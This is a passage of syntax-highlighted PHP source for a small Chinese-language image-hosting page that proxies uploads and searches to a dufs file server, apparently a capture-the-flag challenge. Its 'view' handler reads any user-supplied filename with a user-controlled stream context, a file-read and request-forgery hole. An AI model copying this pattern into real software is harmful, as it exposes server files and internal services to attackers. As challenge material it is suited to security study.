<span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$target_url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_CUSTOMREQUEST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PUT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>            <span class="token string single-quoted-string">'Host: '</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Origin: http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Referer: http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Accept-Encoding: gzip, deflate'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Accept: */*'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Content-Length: '</span> <span class="token operator">.</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$file_content</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$http_code</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$http_code</span> <span class="token operator">&gt;=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$http_code</span> <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'图片上传成功'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'图片上传失败，请稍后再试'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'未选择图片'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$search_query</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$search_query</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'只允许输入数字和字母'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token variable">$search_url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://'</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/?q='</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$search_query</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&amp;json'</span><span class="token punctuation">;</span>                <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$search_url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>            <span class="token string single-quoted-string">'Host: '</span> <span class="token operator">.</span> <span class="token variable">$dufs_host</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$dufs_port</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'Accept: */*'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$http_code</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$http_code</span> <span class="token operator">&gt;=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$http_code</span> <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$response_data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$response_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paths'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$response_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paths'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$image_extensions</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bmp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'webp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                <span class="token variable">$filtered_paths</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$response_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paths'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$image_extensions</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path_type'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'Directory'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token variable">$filtered_paths</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                                <span class="token variable">$response_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paths'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filtered_paths</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'result'</span> <span class="token operator">=&gt;</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response_data</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'result'</span> <span class="token operator">=&gt;</span> <span class="token variable">$response</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'搜索失败，请稍后再试'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'请输入搜索关键词'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'view'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$file_content</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> @<span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file_content</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$base64_image</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$mime_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                <span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>                 <span class="token string single-quoted-string">'is_image'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'base64_data'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'data:'</span> <span class="token operator">.</span> <span class="token variable">$mime_type</span> <span class="token operator">.</span> <span class="token string single-quoted-string">';base64,'</span> <span class="token operator">.</span> <span class="token variable">$base64_image</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'无法获取图片'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'请输入图片路径'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>迷你图片空间<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">{</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>            <span class="token property">max-width</span><span class="token punctuation">:</span> 800px<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0 auto<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f0f8ff<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.section</span> <span class="token punctuation">{</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #add8e6<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 2px 5px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">h2</span> <span class="token punctuation">{</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #4682b4<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.form-group</span> <span class="token punctuation">{</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">label</span> <span class="token punctuation">{</span>            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>            <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #4682b4<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">input[type="text"], input[type="file"]</span> <span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #add8e6<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">button</span> <span class="token punctuation">{</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px 15px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #4682b4<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">button:hover</span> <span class="token punctuation">{</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #5f9ea0<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.result</span> <span class="token punctuation">{</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> 1px solid #add8e6<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f0f8ff<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">pre</span> <span class="token punctuation">{</span>            <span class="token property">white-space</span><span class="token punctuation">:</span> pre-wrap<span class="token punctuation">;</span>            <span class="token property">word-wrap</span><span class="token punctuation">:</span> break-word<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f5f5f5<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 4px<span class="token punctuation">;</span>            <span class="token property">max-height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>            <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>迷你图片空间<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>上传图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uploadForm<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>选择图片：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">&gt;</span></span>支持所有类型的图片<span 